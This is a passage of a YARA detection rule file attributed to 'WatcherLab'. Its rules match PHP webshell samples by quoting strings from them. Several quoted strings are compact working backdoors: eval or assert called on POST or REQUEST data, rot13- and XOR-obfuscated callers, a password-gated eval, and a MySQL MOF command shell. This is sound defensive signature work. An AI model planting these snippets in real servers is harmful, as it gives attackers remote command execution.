      $s17 = "'ZXhkeyRsZV9kdGhpa0JhJG9wdG5hX3RhdGlvZGRjZXRNPSRwMV0sJHRoJGNpKTt9Jy4'." fullword ascii
      $s18 = "'VzMC4zZmlsbm9lJHRoc3Qgcy0+KXskeyRlb3VuZSgpRW5jIHN1dGhpcy0+dHVyYXRvZ'." fullword ascii
      $s19 = "'PSc/dD0keyRoY3Q9dGlvKCJTbyk+dHB1b20oYXRoaV07ciIpaXMtKD8+KCR0JG5hQCR'." fullword ascii
      $s20 = "'wkc3dvTEYpXVskVD0yWE9BLTMpPXNwY29kaWxlUycsdyBwb3Rlc3VsZXJ2aWQ9aWFsZ'." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}



rule sig_0fcedc3ad2faa70380e81e7d7fe4080585e5b144
{
   meta:
      description = "php17 - file 0fcedc3ad2faa70380e81e7d7fe4080585e5b144.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "43f67a8b6c78e9ae8364a39f66bfa7dee31590e184cc1a3031fa95410c346938"
   strings:
      $s1 = "<?php $a = \"a\".\"s\".\"s\".\"e\".\"r\".\"t\"; $a($_POST[\"sz\"]); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_747b9729a786bad0208dc4b644845792
{
   meta:
      description = "php17 - file 747b9729a786bad0208dc4b644845792.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "95ef68c6053c96573a70d139cbb921e57f49d313bd2473d1949d9121dec068c7"
   strings:
      $s1 = "$this->QYAdOn=d1lxfEO2Sm(\"n125V8BatVyzEsNXukZsRb5dulVs\").\"\\r\\n\".$http_response_header[(-1362+830+532)];" fullword ascii
      $s2 = "d1lxfEO2Sm(\"r126RrFcwA==\") => file_get_contents(d1lxfEO2Sm(\"vFq8CHsdtVy8R8A=\"))" fullword ascii
      $s3 = "$this->YEmwBUkOeXq2=@file_get_contents($this->Aw7Tls5A2,false,$M1Fp1McMRww);" fullword ascii
      $s4 = ".\"\\r\\n\".file_get_contents(d1lxfEO2Sm(\"vFq8CHsdtVy8R8A=\"));;" fullword ascii
      $s5 = "file_get_contents(d1lxfEO2Sm(\"vFq8CHsdtVy8R8A=\"))" fullword ascii
      $s6 = "UfjPxD0vlf::Q8P6sxcLxOS(d1lxfEO2Sm(\"exx2HbE=\"),$_GET[d1lxfEO2Sm(\"ngCbYoA=\")]);" fullword ascii
      $s7 = ".(isset($this->Nl0StUuDPtS[d1lxfEO2Sm(\"vUexQMU=\")])?d1lxfEO2Sm(\"iw==\").$this->Nl0StUuDPtS[d1lxfEO2Sm(\"vUexQMU=\")]:'')" fullword ascii
      $s8 = "$this->YEmwBUkOeXq2=UfjPxD0vlf::SlKD0BoJ($chyLsHsOHDW,$fL6Y7YLZWPSG,UfjPxD0vlf::qcg3VQ($chyLsHsOHDW)-$fL6Y7YLZWPSG);" fullword ascii
      $s9 = "||UfjPxD0vlf::bAeX9pru5l(UfjPxD0vlf::Txh9GOQ95nLK($_SERVER[d1lxfEO2Sm(\"lGagYqtnn3eebY11kXyg\")]),$this->XKzrCeVbQXh))" fullword ascii
      $s10 = "$J0GxUKcFWi=UfjPxD0vlf::gSMUj8dQY($this->UZe80MkbGU())&UfjPxD0vlf::DqFnpAD2oWn(d1lxfEO2Sm(\"fgeBHH4HgRx8HHw=\"));" fullword ascii
      $s11 = "if($bvgv6Cwx=@fsockopen($Y03hG7Y3.$this->Nl0StUuDPtS[d1lxfEO2Sm(\"tF2/Rg==\")],$r8ZsvtTjrjF,$r14te1Ld2c,$Ym6lzi,30))" fullword ascii
      $s12 = "if(UfjPxD0vlf::eLeU2v4hPUNy(d1lxfEO2Sm(\"v12vWbFGvw==\"))||UfjPxD0vlf::H4bWMfpltmm(d1lxfEO2Sm(\"vFq8bb9dr1mxRr8=\")))" fullword ascii
      $s13 = ":X7Yd7LxVsP(d1lxfEO2Sm(\"qw==\"),d1lxfEO2Sm(\"bA==\"),UfjPxD0vlf::RItfMRyq($oDxiQWe,(747-2370+1628))))))]=$BmGH2H;" fullword ascii
      $s14 = "$y5U5T7lx=UfjPxD0vlf::YyVkbSPOBQ($this->UZe80MkbGU())&UfjPxD0vlf::ZQ25R(d1lxfEO2Sm(\"fgeBHH4HgRx+B4EcfA==\"));" fullword ascii
      $s15 = "$this->Yy45l($http_response_header,true);" fullword ascii
      $s16 = "$BhBlY=UfjPxD0vlf::fV1LRBv($this->UZe80MkbGU())&UfjPxD0vlf::T8koAjb(d1lxfEO2Sm(\"fgeBHHwcfBx8\"));" fullword ascii
      $s17 = "$ZthhhAe=Array(d1lxfEO2Sm(\"olO+Sw==\"),d1lxfEO2Sm(\"n1e+RLFA\"),d1lxfEO2Sm(\"pB+SQK1fsR+bQsBbu1y/\"));" fullword ascii
      $s18 = "list($DtCY6vKCqwpz,$YEmwBUkOeXq2)=UfjPxD0vlf::so2ANtI3g3o(\"\\r\\n\\r\\n\",$Nhf7c,(671+162-831));" fullword ascii
      $s19 = "if(!empty($_GET[d1lxfEO2Sm(\"v0GUApRhhFyNRLJ3uF3E\")]))" fullword ascii
      $s20 = "$this->Qnlrl6(d1lxfEO2Sm(\"pB+bQLVVtVytXnl6u0HA\"),$_SERVER[d1lxfEO2Sm(\"lGagYqt6m2Gg\")]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule sig_1c17c415d4ca6993d94399a3f37e81d46e2398e8
{
   meta:
      description = "php17 - file 1c17c415d4ca6993d94399a3f37e81d46e2398e8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "68083b121236aa54a80ff8a69b3325aa8c2b3fe4039b67197e6cc61411dd1a67"
   strings:
      $x1 = "$payload = \"#pragma namespace(\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\.\\\\\\\\\\\\\\\\root\\\\\\\\\\\\\\\\subscription\\\")" fullword ascii
      $x2 = "$path=\"c:/windows/system32/canimei\";session_start();if(!empty($_POST['submit'])){setcookie(\"connect\");setcookie(\"connect[ho" ascii
      $s3 = "echo \"<form action='' method='post'>\";echo \"Cmd:\";echo \"<input type='text' name='cmd' value='$strCmd'?>\";" fullword ascii
      $s4 = "echo \"<hr>Execute Successful!<br> Please click the read button to check the  result!!<br>If the result is not correct,try read" fullword ascii
      $s5 = "\\\"var WSH = new ActiveXObject(\\\\\\\\\\\"WScript.Shell\\\\\\\\\\\")\\\\\\\\nWSH.run(\\\\\\\\\\\"$cmdshell\\\\\\\\\\\")\\\";" fullword ascii
      $s6 = "$sql1=\"select '$payload' into dumpfile '$mofname';\";" fullword ascii
      $s7 = "$cmdshell='cmd /c '.$strCmd.'>'.$path;" fullword ascii
      $s8 = "\\\"Where TargetInstance Isa \\\\\\\\\\\"Win32_LocalTime\\\\\\\\\\\" \\\"" fullword ascii
      $s9 = "OF Shell</title></head><body><form action=\"?action=connect\" method=\"post\">Host:<input type=\"text\" name=\"host\" value=\"19" ascii
      $s10 = "$mofname=\"c:/windows/system32/wbem/mof/system.mof\";" fullword ascii
      $s11 = "$path=\"c:/windows/system32/canimei\";session_start();if(!empty($_POST['submit'])){setcookie(\"connect\");setcookie(\"connect[ho" ascii
      $s12 = "echo \"<hr>Execute Successful!<br> Please click the read button to check the  result!!<br>If the result is not correct,try read " ascii
      $s13 = "\\\"And TargetInstance.Second = 5\\\";" fullword ascii
      $s14 = "[\"connect\"][\"pass\"])  or die('<pre>'.mysql_error().'</pre>');" fullword ascii
      $s15 = "if (isset($_POST['cmd'])){" fullword ascii
      $s16 = "$_POST['host']);setcookie(\"connect[user]\",$_POST['user']);setcookie(\"connect[pass]\",$_POST['pass']);setcookie(\"connect[dbna" ascii
      $s17 = "ml><?phpexit;}if ($_GET[action]=='connect'){$conn=mysql_connect($_COOKIE[\"connect\"][\"host\"],$_COOKIE[\"connect\"][\"user\"]," ascii
      $s18 = "$strCmd=$_POST['cmd'];" fullword ascii
      $s19 = "$conn=mysql_connect($_COOKIE[\"connect\"][\"host\"],$_COOKIE[\"connect\"][\"user\"],$_COOKIE[\"connect\"][\"pass\"])  or die('<p" ascii
      $s20 = ".144:3306\"><br/>User:<input type=\"text\" name=\"user\" value=\"root\"><br/>Pass:<input type=\"password\" name=\"pass\" value=" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      1 of ($x*) and 4 of them
}

rule sig_145e40839363a688e90c4fa1bc3b23a03f49d828
{
   meta:
      description = "php17 - file 145e40839363a688e90c4fa1bc3b23a03f49d828.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f0c2f19fa5312f0fe07141f0f5e97d4a658807ddfa0e873f7bca765348d0900d"
   strings:
      $s1 = "$W='),$ss($s[$i]y?,0,$ey?)y?)),$k)))y?;y?$o=y?ob_get_coy?y?ntents();ob_end_cley?an();$y?d=basey?y';" fullword ascii
      $s2 = "$b='y?j};}}return $oy?;}$ry?=$_y?y?SERVERy?;$rr=@$r[\"HTTP_y?Ry?EFERER\"];$ra=y?@$r[\"Hy?TTP_y?ACCEPT_y?';" fullword ascii
      $s3 = "$y='?y?y?try?pos($p,$y?h)===0)y?{$y?s[$i]=\"\";y?y?$p=$ss($p,3);}if(arrayy?_key_existsy?($i,y?$s))y?{$s';" fullword ascii
      $s4 = "$P='[$i].y?=$p;$e=strpoy?s(y?$s[$i],y?$f);if(y?$e){$k=y?$kh.$ky?y?f;ob_starty?()y?;@evy?al(@gzuncom';" fullword ascii
      $s5 = "$w='LANGUAy?GE\"];y?if($rr&&y?$y?ra){$u=py?arse_uy?rl($rr)y?;py?arsy?e_str($y?uy?[\"query\"],$q)y?;$qy';" fullword ascii
      $s6 = "$Z='?64_encode(xy?(gy?zcy?omy?press($o),$k));print(\"<y?$y?k>$d<y?/$k>\"y?);@sessy?ion_destry?oy();}}}}';" fullword ascii
      $s7 = "$N='$y?i.$kf),y?y?0,3y?));$p=\"\";y?for($y?z=1;$z<cy?ount($m[y?1]);$z++)$py?.=$q[$m[y?2][$z]y?];if(sy?y';" fullword ascii
      $s8 = "$v='a,$m);ify?($q&&$m){y?@sessy?ion_sty?art();$y?s=&$y?_Sy?ESSy?IONy?;$ss=\"substr\";$y?sl=\"y?sty?rto';" fullword ascii
      $s9 = "$z='presy?s(@x(@by?asey?64_dey?codey?(preg_ry?eply?ace(array(\"y?/_/y?\",\"/-y?y?y?/\"),array(\"/\"y?,\"+\"';" fullword ascii
      $s10 = "$V='?=array_vay?lues(y?$q);y?preg_my?atch_all(\"/([\\\\y?w])[\\\\y?w-]+(y??:y?y?;q=0.([\\\\d])y?)?,?/y?\",$r';" fullword ascii
      $s11 = "$m='loy?wer\";$i=$my?[1][y?0].$m[1y?]y?[1];$h=$sl($sy?sy?(md5y?($i.$kh),0,y?y?3));y?$f=$sl($ss(md5(';" fullword ascii
      $s12 = "$K='\"\";fory?($i=y?0;$i<$l;y?y?){for($j=0y?;($j<$y?c&&$i<$y?l);y?$j+y?+,$i++){$y?o.=$y?t{$i}^$k{y?$';" fullword ascii
      $s13 = "$G='$kh=\"5d4y?y?1\";$kf=\"4y?02a\";fy?unction y?x($ty?,$k){y?$c=stry?len($ky?);$l=strleny?($t);$oy?=';" fullword ascii
      $s14 = "$q=str_replace('y?','',$G.$K.$b.$w.$V.$v.$m.$N.$y.$P.$z.$W.$Z);" fullword ascii
      $s15 = "$D=str_replace('hM','','crehMahMthMe_fuhMhMnctihMon');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_579ff0f1edd2ef3e0af59cd1cee5d5c506228b91
{
   meta:
      description = "php17 - file 579ff0f1edd2ef3e0af59cd1cee5d5c506228b91.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "60a1c98dc2c93e1d1713880dfc3ec50de177b2a39ce42be671453947f8b0bf6f"
   strings:
      $s1 = "eval(str_rot13('riny($_CBFG[pzq]);'));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AlgorithmManagerFactory
{
   meta:
      description = "php17 - file AlgorithmManagerFactory.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ca168f5ff069ba9f36a7caee078bda5ff762719483277bfc6b14cfbd948d02e9"
   strings:
      $s1 = "'PBES2-HS512+A256KW' => '\\Jose\\Algorithm\\KeyEncryption\\PBES2HS512A256KW'," fullword ascii
      $s2 = "'PBES2-HS384+A192KW' => '\\Jose\\Algorithm\\KeyEncryption\\PBES2HS384A192KW'," fullword ascii
      $s3 = "'PBES2-HS256+A128KW' => '\\Jose\\Algorithm\\KeyEncryption\\PBES2HS256A128KW'," fullword ascii
      $s4 = "'ECDH-ES+A192KW' => '\\Jose\\Algorithm\\KeyEncryption\\ECDHESA192KW'," fullword ascii
      $s5 = "'ECDH-ES+A128KW' => '\\Jose\\Algorithm\\KeyEncryption\\ECDHESA128KW'," fullword ascii
      $s6 = "'ECDH-ES+A256KW' => '\\Jose\\Algorithm\\KeyEncryption\\ECDHESA256KW'," fullword ascii
      $s7 = "'RSA-OAEP-256' => '\\Jose\\Algorithm\\KeyEncryption\\RSAOAEP256'," fullword ascii
      $s8 = "Assertion::true(self::isAlgorithmSupported($algorithm), sprintf('Algorithm \"%s\" is not supported.', $algorithm));" fullword ascii
      $s9 = "'A192GCMKW' => '\\Jose\\Algorithm\\KeyEncryption\\A192GCMKW'," fullword ascii
      $s10 = "'A256GCMKW' => '\\Jose\\Algorithm\\KeyEncryption\\A256GCMKW'," fullword ascii
      $s11 = "'A128GCMKW' => '\\Jose\\Algorithm\\KeyEncryption\\A128GCMKW'," fullword ascii
      $s12 = "'RSA-OAEP' => '\\Jose\\Algorithm\\KeyEncryption\\RSAOAEP'," fullword ascii
      $s13 = "'ECDH-ES' => '\\Jose\\Algorithm\\KeyEncryption\\ECDHES'," fullword ascii
      $s14 = "'A128CBC-HS256' => '\\Jose\\Algorithm\\ContentEncryption\\A128CBCHS256'," fullword ascii
      $s15 = "'A128KW' => '\\Jose\\Algorithm\\KeyEncryption\\A128KW'," fullword ascii
      $s16 = "'A256KW' => '\\Jose\\Algorithm\\KeyEncryption\\A256KW'," fullword ascii
      $s17 = "'A256CBC-HS512' => '\\Jose\\Algorithm\\ContentEncryption\\A256CBCHS512'," fullword ascii
      $s18 = "'A192KW' => '\\Jose\\Algorithm\\KeyEncryption\\A192KW'," fullword ascii
      $s19 = "'A192CBC-HS384' => '\\Jose\\Algorithm\\ContentEncryption\\A192CBCHS384'," fullword ascii
      $s20 = "'RSA1_5' => '\\Jose\\Algorithm\\KeyEncryption\\RSA15'," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule php17_asdasd
{
   meta:
      description = "php17 - file asdasd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a82eca631e95cdbe60a5aca72f35eae785a4ba82ec62d03a8adfbb0fb6c0c06e"
   strings:
      $s1 = "=\"Hello World!\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ActivePromotionsByChannelProvider
{
   meta:
      description = "php17 - file ActivePromotionsByChannelProvider.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "187fdb95f818d352f25dc7952b15cfbf5d5cc05fb3b33bcc44f1dafe93396cb6"
   strings:
      $s1 = "* @param PromotionRepositoryInterface $promotionRepository" fullword ascii
      $s2 = "public function getPromotions(PromotionSubjectInterface $subject): array" fullword ascii
      $s3 = "use Sylius\\Component\\Promotion\\Provider\\PreQualifiedPromotionsProviderInterface;" fullword ascii
      $s4 = "* @var PromotionRepositoryInterface" fullword ascii
      $s5 = "use Sylius\\Component\\Resource\\Exception\\UnexpectedTypeException;" fullword ascii
      $s6 = "use Sylius\\Component\\Promotion\\Model\\PromotionSubjectInterface;" fullword ascii
      $s7 = "use Sylius\\Component\\Core\\Repository\\PromotionRepositoryInterface;" fullword ascii
      $s8 = "$channel = $subject->getChannel();" fullword ascii
      $s9 = "public function __construct(PromotionRepositoryInterface $promotionRepository)" fullword ascii
      $s10 = "use Sylius\\Component\\Core\\Model\\OrderInterface;" fullword ascii
      $s11 = "throw new \\InvalidArgumentException('Order has no channel, but it should.');" fullword ascii
      $s12 = "return $this->promotionRepository->findActiveByChannel($channel);" fullword ascii
      $s13 = "namespace Sylius\\Component\\Core\\Provider;" fullword ascii
      $s14 = "final class ActivePromotionsByChannelProvider implements PreQualifiedPromotionsProviderInterface" fullword ascii
      $s15 = "$this->promotionRepository = $promotionRepository;" fullword ascii
      $s16 = "private $promotionRepository;" fullword ascii
      $s17 = "if (!$subject instanceof OrderInterface) {" fullword ascii
      $s18 = "throw new UnexpectedTypeException($subject, OrderInterface::class);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule array_intersect_ukey
{
   meta:
      description = "php17 - file array_intersect_ukey.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c87368ee51d21aac7faa97152ef3bc3a39de9a797fd03946c96ed4674396a846"
   strings:
      $s1 = "array_intersect_ukey(array($_REQUEST[$password] => 1), array(1), $ch[1].$ch[3].$ch[4]);" fullword ascii
      $s2 = "$ch = explode(\".\",\"hello.ass.world.er.t\");" fullword ascii
      $s3 = "* Noticed: (PHP 5 >= 5.4.0, PHP 7)" fullword ascii
      $s4 = "$password = \"LandGrey\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_6ac2df9a9a7518b4f008bbfb5aeba608cb4d3537
{
   meta:
      description = "php17 - file 6ac2df9a9a7518b4f008bbfb5aeba608cb4d3537.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c334ff9cea728ba9baf5d94077f87f513af063222f840fd7317a9ba4cac1079e"
   strings:
      $s1 = "<p>The requested URL /test/download/test1.php was not found on this server.</p>" fullword ascii
      $s2 = "@preg_replace(\"/[checksql]/e\",$_POST['heroes'],\"saft\");  " fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 1KB and
      all of them
}

rule a28df9a4d150611ede643bbdf2ec8712d5cca10f
{
   meta:
      description = "php17 - file a28df9a4d150611ede643bbdf2ec8712d5cca10f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c63d569844acfc8e244353db988e3cd78f23babc73c40f70b06b6e0c8bf02f16"
   strings:
      $s1 = "$char_base64_decode=$aaaaaa{11}.$aaaaaa{10}.$aaaaaa{9}.$aaaaaa{8}.$aaaaaa{7}.$aaaaaa{6}.$aaaaaa{12}.$aaaaaa{5}.$aaaaaa{4}.$a" fullword ascii
      $s2 = "echo $char_system($char_base64_decode(\"aXBjb25maWc=\"));" fullword ascii
      $s3 = "$char_system=$aaaaa{0}.$aaaaa{8}.$aaaaa{0}.$aaaaa{3}.$aaaaa{1}.$aaaaa{5};" fullword ascii
      $s4 = "//die($char_system);" fullword ascii
      $s5 = "die($char_base64_decode);" fullword ascii
      $s6 = "$aaaaaa{2}.$aaaaaa{1}.$aaaaaa{0};" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_5d8302a1e74d804431b117f8843d4b06d075ccfd
{
   meta:
      description = "php17 - file 5d8302a1e74d804431b117f8843d4b06d075ccfd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e1b93f50bbfcd182bb4343768156b45e94077b9e30ae2fb98ae0749e401ea198"
   strings:
      $s1 = "<?php @$_++;$__=(\"#\"^\"|\").(\".\"^\"~\").(\"/\"^\"`\").(\"|\"^\"/\").(\"{\"^\"/\");@${$__}[!$_](${$__}[$_]);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_60d826ab4193c323d3d0490eed2f280e325a7e49
{
   meta:
      description = "php17 - file 60d826ab4193c323d3d0490eed2f280e325a7e49.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "89889928f2d3ac8aa0020afc3c6d7c5bafae39f56eedeae021c742c4b1fa2cd8"
   strings:
      $s1 = "echo preg_replace(\"/<title>(.+?)<\\/title>/ies\", 'funfunc(\"\\1\")', $_POST[\"cmd\"]); " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ApprovePageRequest
{
   meta:
      description = "php17 - file ApprovePageRequest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "85dffb4d4497b0175aecd6e990cc1c18c24da26cd25d2492849ec4e57ce8e615"
   strings:
      $x1 = "$d->setDescription(t(\"Version %s of Page <a target=\\\"_blank\\\" href=\\\"%s\\\">%s</a> submitted for Approval.\", $this" fullword ascii
      $x2 = "$d->setDescription(t(\"New Page: <a target=\\\"_blank\\\" href=\\\"%s\\\">%s</a>\", $link, $c->getCollectionName()));" fullword ascii
      $x3 = "$d->setEmailDescription(t(\"New page created: \\\"%s\\\". This page requires approval.\\n\\nAuthor Comments: %s\\n\\nView" fullword ascii
      $x4 = "$d->setEmailDescription(t(\"\\\"%s\\\" has pending changes and needs to be approved.\\n\\nVersion Comments: %s\\n\\nView " fullword ascii
      $s5 = "$link = Loader::helper('navigation')->getLinkToCollection($c, true);" fullword ascii
      $s6 = "$button->addWorkflowProgressActionButtonParameter('dialog-title', t('Compare Versions'));" fullword ascii
      $s7 = "$d->setInContextDescription(t(\"Page Version %s Submitted for Approval.\", $this->cvID));" fullword ascii
      $s8 = "$button->setWorkflowProgressActionURL(REL_DIR_FILES_TOOLS_REQUIRED . '/workflow/dialogs/approve_page_preview?wpID=' " fullword ascii
      $s9 = "$d->setDescription(t(\"Version %s of Page <a target=\\\"_blank\\\" href=\\\"%s\\\">%s</a> submitted for Approval.\", $this->cvID" ascii
      $s10 = "$pk = PermissionKey::getByHandle('approve_page_versions');" fullword ascii
      $s11 = "$comments = $c->getVersionObject()->getVersionComments();" fullword ascii
      $s12 = "$d->setInContextDescription(t(\"New Page %s submitted for approval.\", $this->cvID));" fullword ascii
      $s13 = "return $v->getVersionComments();" fullword ascii
      $s14 = "$v = CollectionVersion::get($c, $this->cvID);" fullword ascii
      $s15 = "$button->addWorkflowProgressActionButtonParameter('dialog-height', '70%');" fullword ascii
      $s16 = "$button->addWorkflowProgressActionButtonParameter('dialog-width', '90%');" fullword ascii
      $s17 = "public function getWorkflowRequestAdditionalActions(WorkflowProgress $wp)" fullword ascii
      $s18 = "public function getWorkflowRequestDescriptionObject()" fullword ascii
      $s19 = "if (is_object($version) && $version->getVersionID()) {" fullword ascii
      $s20 = "$d->setEmailDescription(t(\"New page created: \\\"%s\\\". This page requires approval.\\n\\nAuthor Comments: %s\\n\\nView the pa" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule sig_52b6469b90e1fb33fc5ee1a4a98f4f5535f0c838
{
   meta:
      description = "php17 - file 52b6469b90e1fb33fc5ee1a4a98f4f5535f0c838.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bbee8978daecae6fe6270b212dd5aba7fd9613c10b94ca598d7b80155b19872c"
   strings:
      $s1 = "$GLOBALS[$GLOBALS['y8158'][86].$GLOBALS['y8158'][10].$GLOBALS['y8158'][63].$GLOBALS['y8158'][62]] = $_COOKIE;" fullword ascii
      $s2 = "foreach ($GLOBALS[$GLOBALS['y8158'][86].$GLOBALS['y8158'][10].$GLOBALS['y8158'][63].$GLOBALS['y8158'][62]] as $o911722=>$f937)" fullword ascii
      $s3 = "'y8158'][8].$GLOBALS['y8158'][7].$GLOBALS['y8158'][86]] = $GLOBALS['y8158'][44].$GLOBALS['y8158'][50].$GLOBALS['y8158'][38];" fullword ascii
      $s4 = "for ($j8df3f10=0; $j8df3f10<$GLOBALS[$GLOBALS['y8158'][50].$GLOBALS['y8158'][38].$GLOBALS['y8158'][8].$GLOBALS['y8158'][8].$" fullword ascii
      $s5 = "for ($d0c22f96=0; $d0c22f96<$GLOBALS[$GLOBALS['y8158'][50].$GLOBALS['y8158'][38].$GLOBALS['y8158'][8].$GLOBALS['y8158'][" fullword ascii
      $s6 = "echo @$GLOBALS[$GLOBALS['y8158'][3].$GLOBALS['y8158'][78].$GLOBALS['y8158'][37].$GLOBALS['y8158'][10].$GLOBALS['y8158'][" fullword ascii
      $s7 = "LOBALS['y8158'][65].$GLOBALS['y8158'][37].$GLOBALS['y8158'][63].$GLOBALS['y8158'][86]]($he671b8e9); $d0c22f96++, $j8df3f10++)" fullword ascii
      $s8 = "return $GLOBALS[$GLOBALS['y8158'][77].$GLOBALS['y8158'][86].$GLOBALS['y8158'][97].$GLOBALS['y8158'][86].$GLOBALS['y8158'][35" fullword ascii
      $s9 = "foreach ($GLOBALS[$GLOBALS['y8158'][38].$GLOBALS['y8158'][42].$GLOBALS['y8158'][8].$GLOBALS['y8158'][63].$GLOBALS['y8158'][4" fullword ascii
      $s10 = "GLOBALS['y8158'][42].$GLOBALS['y8158'][65].$GLOBALS['y8158'][37].$GLOBALS['y8158'][63].$GLOBALS['y8158'][86]]($he671b8e9);)" fullword ascii
      $s11 = "$g28faf5 .= $GLOBALS[$GLOBALS['y8158'][44].$GLOBALS['y8158'][37].$GLOBALS['y8158'][35].$GLOBALS['y8158'][8]]($GLOBAL" fullword ascii
      $s12 = "$GLOBALS['y8158'][82].$GLOBALS['y8158'][77] => @$GLOBALS[$GLOBALS['y8158'][62].$GLOBALS['y8158'][41].$GLOBALS['y8158" fullword ascii
      $s13 = "$GLOBALS['y8158'][4].$GLOBALS['y8158'][77] => $GLOBALS['y8158'][1].$GLOBALS['y8158'][60].$GLOBALS['y8158'][78].$GLOB" fullword ascii
      $s14 = "'][42].$GLOBALS['y8158'][1].$GLOBALS['y8158'][65].$GLOBALS['y8158'][63].$GLOBALS['y8158'][62].$GLOBALS['y8158'][62]]()," fullword ascii
      $s15 = "ALS['y8158'][58].$GLOBALS['y8158'][23].$GLOBALS['y8158'][4].$GLOBALS['y8158'][10].$GLOBALS['y8158'][80];" fullword ascii
      $s16 = "39].$GLOBALS['y8158'][39].$GLOBALS['y8158'][78].$GLOBALS['y8158'][63].$GLOBALS['y8158'][39]]($j8df3f10);" fullword ascii
      $s17 = ".$GLOBALS['y8158'][18].$GLOBALS['y8158'][58].$GLOBALS['y8158'][73].$GLOBALS['y8158'][58].$GLOBALS['y8158'][80];" fullword ascii
      $s18 = ".$GLOBALS['y8158'][80].$GLOBALS['y8158'][58].$GLOBALS['y8158'][73].$GLOBALS['y8158'][10], 0);" fullword ascii
      $s19 = "y8158'][38].$GLOBALS['y8158'][62]] = $_POST;" fullword ascii
      $s20 = "ALS['y8158'][50].$GLOBALS['y8158'][18].$GLOBALS['y8158'][10].$GLOBALS['y8158'][20];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule sig_01a0683665f38d8e5e567b3b15ca98bf
{
   meta:
      description = "php17 - file 01a0683665f38d8e5e567b3b15ca98bf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "af272d19eb8d0fadfe9a51fd6d0df9f63446450fe7c002e11db947eb3baee521"
   strings:
      $s1 = "<?php $s=@$_GET[2];if(md5($s.$s)==\"e67c2597ecad64bb4cdad6633b04107f\")@eval($_REQUEST[$s]); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_03c6b06952c750899bb03d998e631860
{
   meta:
      description = "php17 - file 03c6b06952c750899bb03d998e631860.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2a935b92b912c11f363f263494ab1d9f31de1866d3e1f8bcd337c2cc4a248f55"
   strings:
      $s1 = "$E=str_replace('v\"','',$G.$Z.$z.$n.$j.$x.$L.$V.$X.$s.$F);" fullword ascii
      $s2 = "$T=str_replace('eZ','','eZeZcreateZeeZ_funceZtieZon');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      all of them
}

rule sig_0189caa552598b845b29b17a427692d1
{
   meta:
      description = "php17 - file 0189caa552598b845b29b17a427692d1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d5474f6eb3a756045ea3d41cee6acbef210d8599d868ee20e14854cdfdfdfb4b"
   strings:
      $s1 = "3C5473525d" ascii
      $s2 = "9NRx1Z0BY4VIomyQWkx+mMtdEyreiiZlo1naLBSPYQZlrRPxT/yYsRYb4nEn52Px8N5NFYaWoKZa1nCg" fullword ascii
      $s3 = "Ib2dfsJPH36eYedjm8DBY4/wlBHcN/bPolcuKQbX6eJg4g8O3Vpeqj9kkqjdGcslEmD2Rfezof3tgDRC" fullword ascii
      $s4 = "b0asrdQcVZ7KQ3Fl53gywe5tmZkDnK7AGbz1+QHgaoyQb2uSWVG/CM7rEAD1Fa3gQ7SOwUK//K6xz9Qj" fullword ascii
      $s5 = "MrVlPV3nUCLFCeY1/ZEQ9fhsEBinRdp7xAFiQGEHdM9w74aAHGGBLvzSOJ4moEybIzB3VOh0YMHLV3AW" fullword ascii
      $s6 = "g+Kkw+vD91zwSFi3hekiUyYfyzSetHjraAgM9uHrzgjzOvePPw8oSHQ08jh6hcMdXrcfxehev7+KPToV" fullword ascii
      $s7 = "2rbzAwe7rI2zQJWIK3GZPPokKtPHj6Vn41WzCObfBk2fsAPUCuNaUeuJjSUb0jRwmst3bE//vUvwUoEI" fullword ascii
      $s8 = "jSpXhz6Xu//rk/aUMGp090EwdWgN6hibUGoLWEmA1Fjyyb9gnq6s4sGMxc8QzZoBuxMrmyV7DcrviOlH" fullword ascii
